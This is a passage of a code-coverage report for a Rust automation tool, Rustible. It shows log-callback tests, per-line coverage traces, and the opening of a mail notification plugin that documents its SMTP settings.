callback.on_task_complete(\u0026changed_result).await;\n\n        // Failed result should be logged\n        let failed_result = create_execution_result(\"host1\", \"task3\", false, false, false, \"error\");\n        callback.on_task_complete(\u0026failed_result).await;\n\n        callback.on_playbook_end(\"test-playbook\", false).await;\n\n        // Read and verify - only failure should be in task results\n        let log_path = callback.current_log_path().unwrap();\n        let content = fs::read_to_string(\u0026log_path).unwrap();\n\n        // Count TASK RESULT entries\n        let task_results: Vec\u003c_\u003e = content\n            .lines()\n            .filter(|l| l.contains(\"TASK RESULT\"))\n            .collect();\n        assert_eq!(task_results.len(), 1, \"Only failed task should be logged\");\n        assert!(task_results[0].contains(\"FAILED\"));\n\n        // But stats should still track all\n        let stats = callback.get_stats();\n        let host1_stats = stats.get(\"host1\").unwrap();\n        assert_eq!(host1_stats.ok, 1);\n        assert_eq!(host1_stats.changed, 1);\n        assert_eq!(host1_stats.failed, 1);\n    }\n\n    #[test]\n    fn test_log_warning_and_debug() {\n        let temp_dir = TempDir::new().unwrap();\n        let config = create_test_config(temp_dir.path());\n\n        let callback = LogFileCallback::new(config).unwrap();\n\n        // These should not panic even without active log session\n        callback.log_warning(\"This is a warning\");\n        callback.log_debug(Some(\"host1\"), \"Debug message\");\n        callback.log_debug(None, \"Global debug\");\n    }\n\n    #[tokio::test]\n    async fn test_host_unreachable() {\n        let temp_dir = TempDir::new().unwrap();\n        let config = create_test_config(temp_dir.path());\n\n        let callback = LogFileCallback::new(config).unwrap();\n\n        callback.on_playbook_start(\"test-playbook\").await;\n        callback\n            .on_play_start(\"Test Play\", \u0026[\"host1\".to_string()])\n            .await;\n\n        callback.log_host_unreachable(\"host1\", \"gather_facts\", \"Connection refused\");\n\n        // Verify stats\n        let stats = callback.get_stats();\n        let host1_stats = stats.get(\"host1\").unwrap();\n        assert_eq!(host1_stats.unreachable, 1);\n\n        assert!(callback.has_failures());\n\n        callback.on_playbook_end(\"test-playbook\", false).await;\n\n        // Verify log content\n        let log_path = callback.current_log_path().unwrap();\n        let content = fs::read_to_string(\u0026log_path).unwrap();\n        assert!(content.contains(\"HOST UNREACHABLE\"));\n        assert!(content.contains(\"Connection refused\"));\n    }\n}\n","traces":[{"line":134,"address":[26820000],"length":1,"stats":{"Line":1}},{"line":135,"address":[26820008],"length":1,"stats":{"Line":1}},{"line":146,"address":[26819968],"length":1,"stats":{"Line":1}},{"line":147,"address":[26819976],"length":1,"stats":{"Line":1}},{"line":151,"address":[26830347,26830353,26830032],"length":1,"stats":{"Line":1}},{"line":153,"address":[26830046],"length":1,"stats":{"Line":1}},{"line":155,"address":[26830072],"length":1,"stats":{"Line":1}},{"line":157,"address":[26830124],"length":1,"stats":{"Line":1}},{"line":159,"address":[26830131],"length":1,"stats":{"Line":1}},{"line":161,"address":[26830174],"length":1,"stats":{"Line":1}},{"line":163,"address":[26830190],"length":1,"stats":{"Line":1}},{"line":171,"address":[26807536],"length":1,"stats":{"Line":1}},{"line":172,"address":[26807544],"length":1,"stats":{"Line":1}},{"line":177,"address":[],"length":0,"stats":{"Line":0}},{"line":179,"address":[],"length":0,"stats":{"Line":0}},{"line":194,"address":[29658608,29658838],"length":1,"stats":{"Line":1}},{"line":195,"address":[29658722,29658663],"length":1,"stats":{"Line":2}},{"line":196,"address":[29658818],"length":1,"stats":{"Line":1}},{"line":201,"address":[26820032],"length":1,"stats":{"Line":1}},{"line":202,"address":[26820055],"length":1,"stats":{"Line":1}},{"line":203,"address":[26820060],"length":1,"stats":{"Line":1}},{"line":208,"address":[26820128],"length":1,"stats":{"Line":1}},{"line":209,"address":[26820145],"length":1,"stats":{"Line":1}},{"line":210,"address":[26820149],"length":1,"stats":{"Line":1}},{"line":215,"address":[26820224],"length":1,"stats":{"Line":0}},{"line":216,"address":[26820240],"length":1,"stats":{"Line":0}},{"line":217,"address":[26820243],"length":1,"stats":{"Line":0}},{"line":222,"address":[29658588,29658352],"length":1,"stats":{"Line":1}},{"line":223,"address":[29658466,29658407],"length":1,"stats":{"Line":2}},{"line":224,"address":[29658568],"length":1,"stats":{"Line":1}},{"line":229,"address":[26820320],"length":1,"stats":{"Line":1}},{"line":230,"address":[26820343],"length":1,"stats":{"Line":1}},{"line":231,"address":[26820348],"length":1,"stats":{"Line":1}},{"line":236,"address":[26820176],"length":1,"stats":{"Line":0}},{"line":237,"address":[26820199],"length":1,"stats":{"Line":0}},{"line":238,"address":[26820204],"length":1,"stats":{"Line":0}},{"line":243,"address":[26820080],"length":1,"stats":{"Line":0}},{"line":244,"address":[26820103],"length":1,"stats":{"Line":0}},{"line":245,"address":[26820108],"length":1,"stats":{"Line":0}},{"line":250,"address":[26820272],"length":1,"stats":{"Line":0}},{"line":251,"address":[26820295],"length":1,"stats":{"Line":0}},{"line":252,"address":[26820300],"length":1,"stats":{"Line":0}},{"line":257,"address":[26820400],"length":1,"stats":{"Line":0}},{"line":258,"address":[26820423],"length":1,"stats":{"Line":0}},{"line":259,"address":[26820428],"length":1,"stats":{"Line":0}},{"line":264,"address":[29659100,29658864],"length":1,"stats":{"Line":1}},{"line":265,"address":[29658978,29658919],"length":1,"stats":{"Line":2}},{"line":266,"address":[29659080],"length":1,"stats":{"Line":1}},{"line":271,"address":[26820368],"length":1,"stats":{"Line":1}},{"line":272,"address":[26820376],"length":1,"stats":{"Line":1}},{"line":367,"address":[26829308,26829120],"length":1,"stats":{"Line":1}},{"line":369,"address":[26829142,26829210],"length":1,"stats":{"Line":2}},{"line":375,"address":[26824888,26820560,26824864],"length":1,"stats":{"Line":1}},{"line":376,"address":[26820614],"length":1,"stats":{"Line":1}},{"line":377,"address":[26820639],"length":1,"stats":{"Line":1}},{"line":378,"address":[26820704],"length":1,"stats":{"Line":1}},{"line":379,"address":[26820716],"length":1,"stats":{"Line":1}},{"line":381,"address":[26820971],"length":1,"stats":{"Line":1}},{"line":387,"address":[26823063,26821009],"length":1,"stats":{"Line":2}},{"line":388,"address":[26823691,26824901,26823129],"length":1,"stats":{"Line":1}},{"line":394,"address":[26823764,26823684],"length":1,"stats":{"Line":2}},{"line":395,"address":[26823864,26823787],"length":1,"stats":{"Line":2}},{"line":396,"address":[26824069,26823871],"length":1,"stats":{"Line":2}},{"line":397,"address":[26824288,26824132],"length":1,"stats":{"Line":2}},{"line":398,"address":[26824347],"length":1,"stats":{"Line":1}},{"line":404,"address":[26824170],"length":1,"stats":{"Line":1}},{"line":406,"address":[26821032],"length":1,"stats":{"Line":1}},{"line":407,"address":[26821059],"length":1,"stats":{"Line":1}},{"line":409,"address":[26821354],"length":1,"stats":{"Line":1}},{"line":410,"address":[26824903,26821384],"length":1,"stats":{"Line":1}},{"line":411,"address":[26824959],"length":1,"stats":{"Line":1}},{"line":413,"address":[26821437],"length":1,"stats":{"Line":1}},{"line":419,"address":[26821472],"length":1,"stats":{"Line":1}},{"line":420,"address":[26825254,26821532],"length":1,"stats":{"Line":1}},{"line":421,"address":[26825779,26825328],"length":1,"stats":{"Line":0}},{"line":427,"address":[26825278],"length":1,"stats":{"Line":0}},{"line":430,"address":[26825422],"length":1,"stats":{"Line":1}},{"line":436,"address":[26821587],"length":1,"stats":{"Line":1}},{"line":447,"address":[26821741,26826109],"length":1,"stats":{"Line":2}},{"line":448,"address":[26826171],"length":1,"stats":{"Line":1}},{"line":449,"address":[29659255,29659232],"length":1,"stats":{"Line":3}},{"line":451,"address":[26826249,26826400],"length":1,"stats":{"Line":2}},{"line":456,"address":[26826719],"length":1,"stats":{"Line":1}},{"line":457,"address":[26826889,26826767],"length":1,"stats":{"Line":2}},{"line":458,"address":[26826903],"length":1,"stats":{"Line":1}},{"line":461,"address":[26827225,26826797],"length":1,"stats":{"Line":1}},{"line":462,"address":[26827303,26827233],"length":1,"stats":{"Line":0}},{"line":463,"address":[26827317],"length":1,"stats":{"Line":0}},{"line":466,"address":[26827255,26827711],"length":1,"stats":{"Line":1}},{"line":467,"address":[26827719,26827783],"length":1,"stats":{"Line":0}},{"line":468,"address":[26827797],"length":1,"stats":{"Line":0}},{"line":471,"address":[26828185,26827738],"length":1,"stats":{"Line":1}},{"line":472,"address":[26828278,26828193],"length":1,"stats":{"Line":0}},{"line":473,"address":[26828292],"length":1,"stats":{"Line":0}},{"line":476,"address":[26828220],"length":1,"stats":{"Line":1}},{"line":478,"address":[26821767],"length":1,"stats":{"Line":0}},{"line":479,"address":[26821779],"length":1,"stats":{"Line":0}},{"line":481,"address":[26822004],"length":1,"stats":{"Line":0}},{"line":482,"address":[26822031],"length":1,"stats":{"Line":0}},{"line":484,"address":[26822356],"length":1,"stats":{"Line":1}},{"line":489,"address":[26822368],"length":1,"stats":{"Line":1}},{"line":494,"address":[26822733],"length":1,"stats":{"Line":0}},{"line":495,"address":[26822745],"length":1,"stats":{"Line":0}},{"line":497,"address":[26822967],"length":1,"stats":{"Line":0}},{"line":498,"address":[26823005,26828602],"length":1,"stats":{"Line":0}},{"line":499,"address":[26828610],"length":1,"stats":{"Line":0}},{"line":501,"address":[26828897],"length":1,"stats":{"Line":0}},{"line":508,"address":[26820496],"length":1,"stats":{"Line":1}},{"line":509,"address":[26820515],"length":1,"stats":{"Line":1}},{"line":542,"address":[26805248],"length":1,"stats":{"Line":0}},{"line":543,"address":[26805267],"length":1,"stats":{"Line":0}},{"line":546,"address":[29641173,29641168],"length":1,"stats":{"Line":0}},{"line":550,"address":[26805363],"length":1,"stats":{"Line":0}},{"line":552,"address":[26805433],"length":1,"stats":{"Line":0}},{"line":553,"address":[26805470],"length":1,"stats":{"Line":0}},{"line":554,"address":[26805507],"length":1,"stats":{"Line":0}},{"line":555,"address":[26805547],"length":1,"stats":{"Line":0}},{"line":556,"address":[26805584],"length":1,"stats":{"Line":0}},{"line":557,"address":[26805624],"length":1,"stats":{"Line":0}},{"line":558,"address":[26805664],"length":1,"stats":{"Line":0}},{"line":564,"address":[26806208,26806686,26806624],"length":1,"stats":{"Line":1}},{"line":572,"address":[26806271],"length":1,"stats":{"Line":1}},{"line":579,"address":[26806704,26807514],"length":1,"stats":{"Line":0}},{"line":580,"address":[26806734,26806751],"length":1,"stats":{"Line":0}},{"line":581,"address":[26806845,26806866],"length":1,"stats":{"Line":0}},{"line":582,"address":[26806962,26806987],"length":1,"stats":{"Line":0}},{"line":583,"address":[26807074,26807099],"length":1,"stats":{"Line":0}},{"line":584,"address":[26807176],"length":1,"stats":{"Line":0}},{"line":585,"address":[26807196,26807224],"length":1,"stats":{"Line":0}},{"line":586,"address":[26807322],"length":1,"stats":{"Line":0}},{"line":587,"address":[26807339],"length":1,"stats":{"Line":0}},{"line":588,"address":[26807356,26807387],"length":1,"stats":{"Line":0}},{"line":640,"address":[26818720,26819428,26819448],"length":1,"stats":{"Line":1}},{"line":642,"address":[26818750,26819434,26818828],"length":1,"stats":{"Line":2}},{"line":646,"address":[26819072,26819009],"length":1,"stats":{"Line":2}},{"line":650,"address":[26819198,26819252],"length":1,"stats":{"Line":2}},{"line":652,"address":[26819345],"length":1,"stats":{"Line":1}},{"line":658,"address":[26812752],"length":1,"stats":{"Line":0}},{"line":659,"address":[26812766],"length":1,"stats":{"Line":0}},{"line":663,"address":[26816815,26816672,26816821],"length":1,"stats":{"Line":1}},{"line":664,"address":[26816780,26816704],"length":1,"stats":{"Line":2}},{"line":668,"address":[26817941,26817792,26817935],"length":1,"stats":{"Line":1}},{"line":669,"address":[26817900,26817824],"length":1,"stats":{"Line":2}},{"line":673,"address":[26812735,26812741,26812624],"length":1,"stats":{"Line":1}},{"line":674,"address":[26812633,26812704],"length":1,"stats":{"Line":2}},{"line":678,"address":[26819636,26819488,26819630],"length":1,"stats":{"Line":1}},{"line":679,"address":[26819520,26819596],"length":1,"stats":{"Line":2}},{"line":683,"address":[26810255,26807728,26811501],"length":1,"stats":{"Line":1}},{"line":684,"address":[26807751],"length":1,"stats":{"Line":1}},{"line":685,"address":[26807834],"length":1,"stats":{"Line":0}},{"line":688,"address":[26807804],"length":1,"stats":{"Line":1}},{"line":689,"address":[26807812],"length":1,"stats":{"Line":1}},{"line":690,"address":[26807862],"length":1,"stats":{"Line":0}},{"line":694,"address":[26807884],"length":1,"stats":{"Line":1}},{"line":696,"address":[26807968,26807905,26808210,26811491],"length":1,"stats":{"Line":3}},{"line":697,"address":[26811438,26810283,26808288],"length":1,"stats":{"Line":2}},{"line":698,"address":[26810523,26810452],"length":1,"stats":{"Line":2}},{"line":701,"address":[26810604,26810539],"length":1,"stats":{"Line":4}},{"line":702,"address":[26810759,26810801],"length":1,"stats":{"Line":2}},{"line":703,"address":[26810817,26810922],"length":1,"stats":{"Line":2}},{"line":705,"address":[26811029,26810891,26810931],"length":1,"stats":{"Line":3}},{"line":706,"address":[26811099,26811036,26811151],"length":1,"stats":{"Line":3}},{"line":707,"address":[26811335,26811181],"length":1,"stats":{"Line":2}},{"line":715,"address":[26808325],"length":1,"stats":{"Line":3}},{"line":717,"address":[26808371],"length":1,"stats":{"Line":1}},{"line":720,"address":[26808435],"length":1,"stats":{"Line":1}},{"line":721,"address":[26808473],"length":1,"stats":{"Line":0}},{"line":722,"address":[26808699],"length":1,"stats":{"Line":0}},{"line":723,"address":[29641446,29641403],"length":1,"stats":{"Line":0}},{"line":724,"address":[29641464],"length":1,"stats":{"Line":0}},{"line":725,"address":[29641490],"length":1,"stats":{"Line":0}},{"line":726,"address":[29641511],"length":1,"stats":{"Line":0}},{"line":729,"address":[29641435],"length":1,"stats":{"Line":0}},{"line":735,"address":[26808449],"length":1,"stats":{"Line":1}},{"line":737,"address":[26808749],"length":1,"stats":{"Line":1}},{"line":739,"address":[29641200,29641568,29641237,29641582],"length":1,"stats":{"Line":5}},{"line":741,"address":[26808976,26808881],"length":1,"stats":{"Line":2}},{"line":742,"address":[26808995],"length":1,"stats":{"Line":1}},{"line":744,"address":[26809002],"length":1,"stats":{"Line":1}},{"line":745,"address":[26809073,26809190],"length":1,"stats":{"Line":1}},{"line":746,"address":[26809155,26810228,26809227],"length":1,"stats":{"Line":3}},{"line":747,"address":[26809462],"length":1,"stats":{"Line":1}},{"line":748,"address":[26809711,26809812],"length":1,"stats":{"Line":2}},{"line":749,"address":[26809987,26810093],"length":1,"stats":{"Line":2}},{"line":750,"address":[26810120],"length":1,"stats":{"Line":1}},{"line":755,"address":[26808711],"length":1,"stats":{"Line":1}},{"line":759,"address":[26817952,26818705,26818699],"length":1,"stats":{"Line":1}},{"line":760,"address":[26818008],"length":1,"stats":{"Line":1}},{"line":761,"address":[26818200],"length":1,"stats":{"Line":1}},{"line":762,"address":[26818071],"length":1,"stats":{"Line":1}},{"line":764,"address":[26818295],"length":1,"stats":{"Line":3}},{"line":767,"address":[26818405],"length":1,"stats":{"Line":1}},{"line":774,"address":[26815537,26812816,26815837],"length":1,"stats":{"Line":1}},{"line":775,"address":[26812864],"length":1,"stats":{"Line":1}},{"line":776,"address":[26813056,26812949],"length":1,"stats":{"Line":2}},{"line":778,"address":[26813516,26813458,26813242,26815759],"length":1,"stats":{"Line":2}},{"line":781,"address":[26813362],"length":1,"stats":{"Line":1}},{"line":782,"address":[26813397],"length":1,"stats":{"Line":1}},{"line":783,"address":[26813500,26813431],"length":1,"stats":{"Line":1}},{"line":785,"address":[26813648,26813579],"length":1,"stats":{"Line":2}},{"line":786,"address":[26813656,26815722,26813727,26813842,26813787],"length":1,"stats":{"Line":2}},{"line":787,"address":[26813965,26815692,26814131,26814065],"length":1,"stats":{"Line":1}},{"line":789,"address":[26814264,26815464],"length":1,"stats":{"Line":2}},{"line":790,"address":[26814308],"length":1,"stats":{"Line":1}},{"line":793,"address":[26814353],"length":1,"stats":{"Line":1}},{"line":794,"address":[26815588,26814533,26814783,26814725],"length":1,"stats":{"Line":2}},{"line":797,"address":[26814641],"length":1,"stats":{"Line":1}},{"line":798,"address":[26814670],"length":1,"stats":{"Line":1}},{"line":799,"address":[26814698,26814767],"length":1,"stats":{"Line":1}},{"line":801,"address":[26815032,26814973,26814913,26814838,26815551],"length":1,"stats":{"Line":2}},{"line":802,"address":[26815515,26815157,26815257,26815323],"length":1,"stats":{"Line":1}},{"line":805,"address":[26814270],"length":1,"stats":{"Line":1}},{"line":809,"address":[26812112,26812599,26811520],"length":1,"stats":{"Line":1}},{"line":810,"address":[26811545,26811610],"length":1,"stats":{"Line":2}},{"line":813,"address":[26811671,26811620],"length":1,"stats":{"Line":2}},{"line":814,"address":[26811726],"length":1,"stats":{"Line":1}},{"line":815,"address":[26811758,26811826,26812057],"length":1,"stats":{"Line":3}},{"line":816,"address":[26812068],"length":1,"stats":{"Line":1}},{"line":821,"address":[26812123,26811738],"length":1,"stats":{"Line":2}},{"line":822,"address":[26812191],"length":1,"stats":{"Line":1}},{"line":823,"address":[26812221,26812526,26812292],"length":1,"stats":{"Line":3}},{"line":824,"address":[26812537],"length":1,"stats":{"Line":1}},{"line":830,"address":[26816625,26816646,26815856],"length":1,"stats":{"Line":1}},{"line":831,"address":[26815871],"length":1,"stats":{"Line":1}},{"line":833,"address":[26815913,26815967],"length":1,"stats":{"Line":2}},{"line":834,"address":[26816069,26816012],"length":1,"stats":{"Line":2}},{"line":836,"address":[26816024,26816090,26816636,26816148],"length":1,"stats":{"Line":1}},{"line":838,"address":[26816258],"length":1,"stats":{"Line":1}},{"line":839,"address":[26816381,26816325],"length":1,"stats":{"Line":2}},{"line":841,"address":[26816337,26816462,26816402,26816615],"length":1,"stats":{"Line":1}},{"line":845,"address":[26816832],"length":1,"stats":{"Line":1}},{"line":846,"address":[26816851],"length":1,"stats":{"Line":1}},{"line":847,"address":[26816876,26816935],"length":1,"stats":{"Line":2}},{"line":848,"address":[26816907,26816963,26816990],"length":1,"stats":{"Line":1}},{"line":849,"address":[26816951],"length":1,"stats":{"Line":1}},{"line":854,"address":[26807568],"length":1,"stats":{"Line":1}},{"line":855,"address":[26807618],"length":1,"stats":{"Line":1}},{"line":856,"address":[26807604],"length":1,"stats":{"Line":1}},{"line":861,"address":[26819648,26819949,26819943],"length":1,"stats":{"Line":1}},{"line":862,"address":[26819795],"length":1,"stats":{"Line":1}},{"line":863,"address":[26819717],"length":1,"stats":{"Line":1}},{"line":864,"address":[26819732],"length":1,"stats":{"Line":1}},{"line":869,"address":[26817024,26817768,26817774],"length":1,"stats":{"Line":1}},{"line":872,"address":[26817130],"length":1,"stats":{"Line":1}},{"line":873,"address":[26817220,26817156],"length":1,"stats":{"Line":2}},{"line":874,"address":[26817305,26817350],"length":1,"stats":{"Line":1}},{"line":875,"address":[26817375,26817338],"length":1,"stats":{"Line":2}},{"line":878,"address":[26817565],"length":1,"stats":{"Line":1}},{"line":879,"address":[26817402],"length":1,"stats":{"Line":1}},{"line":880,"address":[26817447],"length":1,"stats":{"Line":1}},{"line":881,"address":[26817505],"length":1,"stats":{"Line":1}},{"line":892,"address":[26797267],"length":1,"stats":{"Line":5}},{"line":894,"address":[29638966,29639049],"length":1,"stats":{"Line":2}},{"line":897,"address":[29639080],"length":1,"stats":{"Line":1}},{"line":898,"address":[29639168,29639270],"length":1,"stats":{"Line":0}},{"line":904,"address":[29639390,29639200],"length":1,"stats":{"Line":2}},{"line":905,"address":[29639484,29639398],"length":1,"stats":{"Line":2}},{"line":906,"address":[29639528,29639650,29640045,29639716,29639555],"length":1,"stats":{"Line":1}},{"line":907,"address":[29639843],"length":1,"stats":{"Line":1}},{"line":908,"address":[29639882],"length":1,"stats":{"Line":1}},{"line":912,"address":[29639953],"length":1,"stats":{"Line":1}},{"line":913,"address":[29639926],"length":1,"stats":{"Line":1}},{"line":917,"address":[26797067],"length":1,"stats":{"Line":4}},{"line":918,"address":[29633884],"length":1,"stats":{"Line":1}},{"line":919,"address":[29633477,29633571],"length":1,"stats":{"Line":2}},{"line":920,"address":[29633587,29633705,29633641],"length":1,"stats":{"Line":3}},{"line":922,"address":[29634348,29633654,29634336],"length":1,"stats":{"Line":3}},{"line":924,"address":[29633722,29633779],"length":1,"stats":{"Line":2}},{"line":927,"address":[29634085],"length":1,"stats":{"Line":1}},{"line":928,"address":[29633958],"length":1,"stats":{"Line":1}},{"line":931,"address":[29634035],"length":1,"stats":{"Line":1}},{"line":934,"address":[29634243],"length":1,"stats":{"Line":1}},{"line":937,"address":[26796909],"length":1,"stats":{"Line":4}},{"line":940,"address":[29631905,29631806],"length":1,"stats":{"Line":2}},{"line":941,"address":[29631910,29631983],"length":1,"stats":{"Line":2}},{"line":942,"address":[29632075,29632379],"length":1,"stats":{"Line":2}},{"line":946,"address":[29632223],"length":1,"stats":{"Line":1}},{"line":947,"address":[29632107],"length":1,"stats":{"Line":1}},{"line":948,"address":[29632139],"length":1,"stats":{"Line":1}},{"line":952,"address":[26796827],"length":1,"stats":{"Line":4}},{"line":953,"address":[29631581],"length":1,"stats":{"Line":1}},{"line":954,"address":[29631485],"length":1,"stats":{"Line":1}},{"line":959,"address":[26796989],"length":1,"stats":{"Line":4}},{"line":962,"address":[29632665,29632566],"length":1,"stats":{"Line":2}},{"line":963,"address":[29633302,29632773,29632694,29632670,29632840],"length":1,"stats":{"Line":1}},{"line":966,"address":[29633098],"length":1,"stats":{"Line":1}},{"line":967,"address":[29632969],"length":1,"stats":{"Line":1}},{"line":968,"address":[29633001],"length":1,"stats":{"Line":1}},{"line":969,"address":[29633082],"length":1,"stats":{"Line":1}},{"line":970,"address":[29633090],"length":1,"stats":{"Line":1}},{"line":974,"address":[29634557,29635295,29634415,29634527,29634384,29638358,29638238,29635311],"length":1,"stats":{"Line":5}},{"line":976,"address":[29634509,29634603],"length":1,"stats":{"Line":2}},{"line":978,"address":[29634681,29634617],"length":1,"stats":{"Line":2}},{"line":979,"address":[29634697,29634768],"length":1,"stats":{"Line":2}},{"line":981,"address":[29634884,29635261],"length":1,"stats":{"Line":1}},{"line":982,"address":[29635266,29635258,29634928],"length":1,"stats":{"Line":0}},{"line":983,"address":[29634905],"length":1,"stats":{"Line":1}},{"line":984,"address":[29635023,29634964,29635049],"length":1,"stats":{"Line":0}},{"line":985,"address":[29635077,29635034],"length":1,"stats":{"Line":0}},{"line":986,"address":[29635217,29634993,29635176],"length":1,"stats":{"Line":3}},{"line":987,"address":[29635138,29635214,29635222],"length":1,"stats":{"Line":2}},{"line":989,"address":[29635178,29635110,29635174],"length":1,"stats":{"Line":2}},{"line":994,"address":[29635367,29635456,29634651],"length":1,"stats":{"Line":3}},{"line":995,"address":[29635340],"length":1,"stats":{"Line":1}},{"line":996,"address":[29635325,29635399,29635546,29635424],"length":1,"stats":{"Line":4}},{"line":997,"address":[29635372],"length":1,"stats":{"Line":1}},{"line":998,"address":[29635409,29635514,29635485],"length":1,"stats":{"Line":3}},{"line":999,"address":[29635487],"length":1,"stats":{"Line":1}},{"line":1001,"address":[29635458],"length":1,"stats":{"Line":1}},{"line":1006,"address":[29635556],"length":1,"stats":{"Line":1}},{"line":1007,"address":[29635677,29635606],"length":1,"stats":{"Line":2}},{"line":1009,"address":[29635787,29636108],"length":1,"stats":{"Line":2}},{"line":1010,"address":[29636105,29636113,29635828],"length":1,"stats":{"Line":2}},{"line":1011,"address":[29635808],"length":1,"stats":{"Line":1}},{"line":1012,"address":[29635908,29635931,29635858],"length":1,"stats":{"Line":2}},{"line":1013,"address":[29635957,29635919],"length":1,"stats":{"Line":2}},{"line":1014,"address":[29636038,29635884,29636073],"length":1,"stats":{"Line":3}},{"line":1015,"address":[29636075,29636009,29636070],"length":1,"stats":{"Line":2}},{"line":1017,"address":[29636040,29636036,29635987],"length":1,"stats":{"Line":2}},{"line":1022,"address":[29636267,29636200,29636142],"length":1,"stats":{"Line":2}},{"line":1023,"address":[29636241],"length":1,"stats":{"Line":0}},{"line":1025,"address":[29636214,29636269],"length":1,"stats":{"Line":2}},{"line":1029,"address":[29636529,29636333,29636475],"length":1,"stats":{"Line":2}},{"line":1030,"address":[29637201,29636844,29636664,29636485],"length":1,"stats":{"Line":2}},{"line":1033,"address":[29636895,29638480,29638489],"length":1,"stats":{"Line":0}},{"line":1034,"address":[29636930],"length":1,"stats":{"Line":0}},{"line":1037,"address":[29638393,29638384,29637015],"length":1,"stats":{"Line":0}},{"line":1038,"address":[29637050],"length":1,"stats":{"Line":0}},{"line":1039,"address":[29637057],"length":1,"stats":{"Line":0}},{"line":1041,"address":[29636712],"length":1,"stats":{"Line":1}},{"line":1044,"address":[29636343],"length":1,"stats":{"Line":0}},{"line":1048,"address":[29636641,29637232],"length":1,"stats":{"Line":2}},{"line":1049,"address":[29637379,29637313,29637458,29637242],"length":1,"stats":{"Line":0}},{"line":1050,"address":[29637329],"length":1,"stats":{"Line":0}},{"line":1051,"address":[29637443,29638416,29638434],"length":1,"stats":{"Line":0}},{"line":1053,"address":[29637353],"length":1,"stats":{"Line":0}},{"line":1056,"address":[29637206],"length":1,"stats":{"Line":1}},{"line":1059,"address":[29637906],"length":1,"stats":{"Line":1}},{"line":1060,"address":[29637279],"length":1,"stats":{"Line":1}},{"line":1061,"address":[29637509],"length":1,"stats":{"Line":1}},{"line":1062,"address":[29637577],"length":1,"stats":{"Line":1}},{"line":1063,"address":[29637661],"length":1,"stats":{"Line":1}},{"line":1064,"address":[29637675],"length":1,"stats":{"Line":1}},{"line":1065,"address":[29637746],"length":1,"stats":{"Line":1}},{"line":1066,"address":[29637786],"length":1,"stats":{"Line":1}},{"line":1067,"address":[29637826],"length":1,"stats":{"Line":1}},{"line":1068,"address":[29637866],"length":1,"stats":{"Line":1}},{"line":1072,"address":[26797331],"length":1,"stats":{"Line":0}},{"line":1073,"address":[29640283],"length":1,"stats":{"Line":0}},{"line":1074,"address":[29640190],"length":1,"stats":{"Line":0}},{"line":1078,"address":[26797192],"length":1,"stats":{"Line":0}},{"line":1079,"address":[29638590,29638677],"length":1,"stats":{"Line":0}},{"line":1081,"address":[29638736],"length":1,"stats":{"Line":0}},{"line":1082,"address":[29638705],"length":1,"stats":{"Line":0}}],"covered":265,"coverable":354},{"path":["/","home","artur","Repositories","rustible","src","callback","plugins","mail.rs"],"content":"//! Mail Callback Plugin for Rustible.\n//!\n//! This plugin sends email notifications on playbook completion,\n//! providing a summary of the execution in the email body.\n//!\n//! # Features\n//!\n//! - Sends email on playbook completion (success or failure)\n//! - Includes execution summary with per-host statistics\n//! - Configurable recipient list\n//! - SMTP configuration via environment variables\n//! - Optional: Only send email on failure\n//!\n//! # Environment Variables\n//!\n//! - `RUSTIBLE_SMTP_HOST` - SMTP server hostname (required)\n//! - `RUSTIBLE_SMTP_PORT` - SMTP server port (default: 587)\n//! - `RUSTIBLE_SMTP_USER` - SMTP authentication username (optional)\n//! - `RUSTIBLE_SMTP_PASSWORD` - SMTP authentication password (optional)\n//! - `RUSTIBLE_SMTP_FROM` - Sender email address (required)\n//! - `RUSTIBLE_SMTP_TLS` - Use TLS: \"true\", \"false\", \"starttls\" (default: \"starttls\")\n//! - `RUSTIBLE_MAIL_RECIPIENTS` - Comma-separated recipient list\n//! - `RUSTIBLE_MAIL_ON_FAILURE_ONLY` - Only send on failure: \"true\"/\"false\" (default: \"false\")\n//!\n//! # Example Usage\n//!\n//! ```rust,ignore\n//! use rustible::callback::plugins::{MailCallback, MailConfig};\n//!\n//! // Using environment variables\n//! let callback = MailCallback::from_env()?;\n//!\n//! // Or explicit configuration\n//! let config = MailConfig {\n//!     smtp_host: \"smtp.example.com\".to_string(),\n//!     smtp_port: 587,\n//!     smtp_user: Some(\"user@example.com\".to_string()),\n//!     smtp_password: Some(\"password\".to_string()),\n//!     from_address: \"rustible@example.com\".to_string(),\n//!     recipients: vec![\"admin@example.com\".to_string()],\n//!     tls_mode: TlsMode::StartTls,\n//!     on_failure_only: false,\n//!     subject_prefix: \"[Rustible]\".to_string(),\n//!     timeout_secs: 30,\n//! };\n//! let callback = MailCallback::new(config);\n//! ```\n//!\n//! # Example Email\n//!\n//! ```text\n//! Subject: [Rustible] Playbook 'deploy-webservers' completed successfully\n//!\n//! Playbook Execution Summary\n//! ==========================\n//!\n//! Playbook: deploy-webservers\n//! Status: SUCCESS\n//! Duration: 2m 34.5s\n//!\n//! Host Summary\n//! ------------\n//!\n//! webserver1:\n//!   OK: 12  Changed: 5  Failed: 0  Skipped: 2  Unreachable: 0\n//!\n//! webserver2:\n//!   OK: 12  Changed: 5  Failed: 0  Skipped: 2  Unreachable: 0\n//!\n//! Totals\n//! ------\n//! Total OK: 24\n//! Total Changed: 10\n//! Total Failed: 0\n//! Total Skipped: 4\n//! Total Unreachable: 0\n//!\n//! ---\n//! Generated by Rustible\n//! ```\n\nuse std::collections::HashMap;\nuse std::env;\nuse std::fmt::Write as FmtWrite;\nuse std::io::{Read, Write};\nuse std::net::TcpStream;\nuse std::sync::Arc;\nuse std::time::Instant;\n\nuse async_trait::async_trait;\nuse base64::Engine;\nuse tokio::sync::RwLock;\n\nuse crate::error::{Error, Result};\nuse crate::facts::Facts;\nuse crate::traits::{ExecutionCallback, ExecutionResult};\n\n/// TLS mode for SMTP connection.\n#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]\npub enum TlsMode {\n    /// No TLS (plain text) - not recommended for production\n    None,\n    /// Implicit TLS (connect with TLS from the start, typically port 465)\n    Implicit,\n    /// STARTTLS (upgrade connection to TLS, typically port 587)\n    #[default]\n    StartTls,\n}\n\nimpl TlsMode {\n    /// Parse TLS mode from string.\n    ///\n    /// Accepts various formats:\n    /// - \"none\", \"false\", \"0\" -\u003e None\n    /// - \"implicit\", \"tls\", \"ssl\" -\u003e Implicit\n    /// - \"starttls\", \"true\", \"1\" -\u003e StartTls (default for unrecognized)\n    pub fn from_str(s: \u0026str) -\u003e Self {\n        match s.to_lowercase().as_str() {\n            \"none\" | \"false\" | \"0\" =\u003e Self::None,\n            \"implicit\" | \"tls\" | \"ssl\" =\u003e Self::Implicit,\n            \"starttls\" | 